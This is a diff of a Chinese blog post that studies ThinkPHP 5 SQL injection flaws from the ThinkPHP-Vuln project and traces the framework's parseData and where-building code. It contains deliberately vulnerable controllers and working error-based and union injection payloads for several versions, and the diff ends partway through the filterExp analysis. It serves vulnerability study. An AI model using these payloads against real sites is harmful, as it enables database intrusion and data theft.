@@ -466,199 +466,725 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p>  最近因为一直在看Node.js相关的漏洞跟开发去了,加上自己一直对php心里有种厌恶感,导致没有劲头去深入学习。而上周hw的经历让我意识到php仍旧是国内各种网站的大头。所以痛下决心,开始把php跟java的知识同步学习。这里就用红日七月火师傅他们的<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">thinkphpvuln</a>项目吧。希望能够对代审的功力有所提升。</p>
 <h2 id="tp5-sqli-insert"><a href="#tp5-sqli-insert" class="headerlink" title="tp5-sqli-insert"></a>tp5-sqli-insert</h2><p>安装的话composer 一把梭。具体参见Thinkphp-vuln项目。安装tpdemo<br>5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 版本间的sql注入漏洞。利用的话需要更改Index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
 
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);
+        return &#39;Update success&#39;;
+    }
+}</code></pre>
 <p>利用payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/05/Thinkphp-vuln/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>http://localhost/tpdemo/public/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>注意这是在开启了tp的app_debug情况下的。否则我们的报错注入应该是看不到回显。</p>
 <p>首先我们跟着Index.php中db这行语句,跟进think/db/Query.php的insert函数。<br><img src="/2020/08/05/Thinkphp-vuln/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>执行的sql语句如下。我们必然要跟进这个sql语句研究注入的可能。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code></pre>
 <p>首先 <code>$this-&gt;builder</code> 为\think\db\builder\Mysql 类(这个其实就取决于你连接的数据库类型。稍微往前跟下可以看到) Mysql类继承于Builder类。所以<br>看向Builder的insert函数。</p>
 <p><img src="/2020/08/05/Thinkphp-vuln/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>这里先跟进下parseData</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取绑定信息</span></span><br><span class="line">    $bind = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind($options[<span class="string">'table'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> == $options[<span class="string">'field'</span>]) &#123;</span><br><span class="line">        $fields = array_keys($bind);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fields = $options[<span class="string">'field'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</span><br><span class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 对象数据写入</span></span><br><span class="line">            $val = $val-&gt;__toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($options[<span class="string">'strict'</span>]) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'fields not exists:['</span> . $key . <span class="string">']'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</span><br><span class="line">            $result[$item] = <span class="string">'NULL'</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</span><br><span class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</span><br><span class="line">                    $result[$item] = $val[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($val)) &#123;</span><br><span class="line">            <span class="comment">// 过滤非标量数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strpos($val, <span class="string">':'</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;query-&gt;isBind(substr($val, <span class="number">1</span>))) &#123;</span><br><span class="line">                $result[$item] = $val;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $key = str_replace(<span class="string">'.'</span>, <span class="string">'_'</span>, $key);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="string">'data__'</span> . $key, $val, <span class="keyword">isset</span>($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);</span><br><span class="line">                $result[$item] = <span class="string">':data__'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function parseData($data, $options)
+{
+    if (empty($data)) {
+        return [];
+    }
 
+    // 获取绑定信息
+    $bind = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
+    if (&#39;*&#39; == $options[&#39;field&#39;]) {
+        $fields = array_keys($bind);
+    } else {
+        $fields = $options[&#39;field&#39;];
+    }
+
+    $result = [];
+    foreach ($data as $key =&gt; $val) {
+        $item = $this-&gt;parseKey($key, $options);
+        if (is_object($val) &amp;&amp; method_exists($val, &#39;__toString&#39;)) {
+            // 对象数据写入
+            $val = $val-&gt;__toString();
+        }
+        if (false === strpos($key, &#39;.&#39;) &amp;&amp; !in_array($key, $fields, true)) {
+            if ($options[&#39;strict&#39;]) {
+                throw new Exception(&#39;fields not exists:[&#39; . $key . &#39;]&#39;);
+            }
+        } elseif (is_null($val)) {
+            $result[$item] = &#39;NULL&#39;;
+        } elseif (is_array($val) &amp;&amp; !empty($val)) {
+            switch ($val[0]) {
+                case &#39;exp&#39;:
+                    $result[$item] = $val[1];
+                    break;
+                case &#39;inc&#39;:
+                    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;+&#39; . floatval($val[2]);
+                    break;
+                case &#39;dec&#39;:
+                    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;-&#39; . floatval($val[2]);
+                    break;
+            }
+        } elseif (is_scalar($val)) {
+            // 过滤非标量数据
+            if (0 === strpos($val, &#39;:&#39;) &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) {
+                $result[$item] = $val;
+            } else {
+                $key = str_replace(&#39;.&#39;, &#39;_&#39;, $key);
+                $this-&gt;query-&gt;bind(&#39;data__&#39; . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);
+                $result[$item] = &#39;:data__&#39; . $key;
+            }
+        }
+    }
+    return $result;
+}</code></pre>
 <p>parsedata接受的参数是我们传进的参数useranme数据。简单看下会发现中间的一个for循环是在遍历我们传进的数组并且只是进行一个拼接的操作。最后返回数据。比如我们的payload对应如下。<code>$val[0]=inc</code>,之后返回的<code>$result</code>只是<code>$val[1],$val[2]</code>的拼接。parseKey 方法并没有在处理我们的输入数据后影响什么。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">所以这里处理完后回到insert函数。我们的输入直接送到返回拼接的sql语句。造成sql注入</span><br><span class="line">完整语句不妨直接在debug报错的地方看。会发现回显了sql语句</span><br><span class="line">```sql</span><br><span class="line">INSERT INTO `users` (`username`) VALUES (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">case &#39;inc&#39;:
+    $result[$item] = $this-&gt;parseKey($val[1]) . &#39;+&#39; . floatval($val[2]);
+    break;</code></pre>
+<p>所以这里处理完后回到insert函数。我们的输入直接送到返回拼接的sql语句。造成sql注入<br>完整语句不妨直接在debug报错的地方看。会发现回显了sql语句</p>
+<pre><code class="sql">INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,version(),0x7e),1)+1)</code></pre>
 <p>显然上面case语句那里理论上<code>exp,inc,dec</code>都可以造成sql注入。但实际测试会发现只有<code>username[0]</code>为<code>exp</code>无法注入。这是因为thinkphp内置过滤会将exp处理变为<code>exp{空格}</code>。导致无法注入。</p>
 <h2 id="tp5-sqli-update"><a href="#tp5-sqli-update" class="headerlink" title="tp5-sqli-update"></a>tp5-sqli-update</h2><p>配置Index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;where([<span class="string">'id'</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
 
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        db(&#39;users&#39;)-&gt;where([&#39;id&#39; =&gt; 1])-&gt;update([&#39;username&#39; =&gt; $username]);
+        return &#39;Update success&#39;;
+    }
+}</code></pre>
 <p>大致思路跟上面一样。只不过此处是update注入。我们同样可以跟到Query.php。发现其实调用的是Connection类的update方法。代码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql  = <span class="keyword">$this</span>-&gt;builder-&gt;update($query);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$sql  = $this-&gt;builder-&gt;update($query);</code></pre>
 <p>builder依旧是上面提过的Builder类对象。其update方法依旧是先调用parseData再进行sql语句的返回。我们来看看修复后的parseData的case语句<br><img src="/2020/08/05/Thinkphp-vuln/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>default代码段parseArrayData</p>
 <p><img src="/2020/08/05/Thinkphp-vuln/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>(这里我composer装不了tp5.1.7,如果是之前的版本parseArrayData应该是直接返回false的)</p>
 <p>可以看到最后其实result是这样形式的字符串<code>$fun(&#39;$point($value)&#39;)</code>。那与我们之前的基本没有什么区别,还是有拼接。直接构造成<code>updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</code>即可.所以我们前面只要进入default分支就能达成这里的sql语句构造了。</p>
 <p>最后攻击payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure>
+<pre><code>?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0 </code></pre><h2 id="tp5-sqli-select"><a href="#tp5-sqli-select" class="headerlink" title="tp5-sqli-select"></a>tp5-sqli-select</h2><p>配置Index.php</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
 
-
-
-<h2 id="tp5-sqli-select"><a href="#tp5-sqli-select" class="headerlink" title="tp5-sqli-select"></a>tp5-sqli-select</h2><p>配置Index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where(<span class="string">'username'</span>,<span class="string">'exp'</span>,$username)-&gt;select();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'select success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username&#39;);
+        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,&#39;exp&#39;,$username)-&gt;select();
+        return &#39;select success&#39;;
+    }
+}</code></pre>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure>
-<p>从成功执行注入的debug界面可以看到我们执行的sql语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> ( <span class="string">`username`</span> ) <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># )</span></span><br></pre></td></tr></table></figure>
+<pre><code>?username=)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</code></pre><p>从成功执行注入的debug界面可以看到我们执行的sql语句</p>
+<pre><code class="sql">SELECT * FROM `users` WHERE ( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# )</code></pre>
 <p>这是一个tp5全版本的注入。不过似乎官方不认这个洞。<br>接下来直接跟下源码.<br>首先我们上面的<code>$username = request()-&gt;get(&#39;username&#39;);</code>会经过Request类调用input方法处理输入.但是这个input方法并没有起到过滤的作用。像我们payload中不含<code>/</code>和<code>.</code>的话就是直接原数据返回。</p>
 <p>然后我们看到接下来调用的Query类的where方法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($field, $op = null, $condition = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $param = func_get_args();</span><br><span class="line">    array_shift($param);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseWhereExp(<span class="string">'AND'</span>, $field, $op, $condition, $param);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function where($field, $op = null, $condition = null)
+{
+    $param = func_get_args();
+    array_shift($param);
+    $this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);
+    return $this;
+}</code></pre>
 <p><code>parseWhereExp</code>这里不用深入,主要是分析查询模式。直接看返回值的话会发现设置了类中的<code>$options[&#39;where&#39;]</code>。我们主要看后面<code>select()</code></p>
 <p>接下来依旧是tp5执行sql语句的老套路。实际调用的是Builder类的select 方法。这个方法调用了巨量的str_replace()用于填充语句。<br><img src="/2020/08/05/Thinkphp-vuln/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>where语句是存在用户可控变量的。所以跟进<code>parseWhere</code>.然后发现调用<code>buildWhere</code></p>
 <p>buildwhere代码量相对更多。但是同样存在一个for循环<code>foreach ($where as $key =&gt; $val)</code>.这里我们进入最后一个else。并且调用<code>parseWhereItem</code>。<br>而parseWhereItem中有这样的elseif</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'EXP'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// 表达式查询</span></span><br><span class="line">    $whereStr .= <span class="string">'( '</span> . $key . <span class="string">' '</span> . $value . <span class="string">' )'</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">elseif (&#39;EXP&#39; == $exp) {
+// 表达式查询
+    $whereStr .= &#39;( &#39; . $key . &#39; &#39; . $value . &#39; )&#39;;</code></pre>
 <p>此处key为username。value为可控变量。即可拼接达成注入。<br><img src="/2020/08/05/Thinkphp-vuln/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="tp5-0-sqli-select-5-0-10"><a href="#tp5-0-sqli-select-5-0-10" class="headerlink" title="tp5.0-sqli-select-5.0.10"></a>tp5.0-sqli-select-5.0.10</h2><p>5.0.10版本的sql注入。配置Index.php如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; $username])-&gt;select();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; $username])-&gt;select();
+        var_dump($result);
+    }
+}</code></pre>
 <p>复现payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,user()#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/05/Thinkphp-vuln/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>前面提到了我们的输入会经过Request的get()方法。它会一路调用input()，getFilter(),filterValue(),filterExp()来处理我们的输入。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span><span class="params">(&amp;$value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>, $value)) &#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
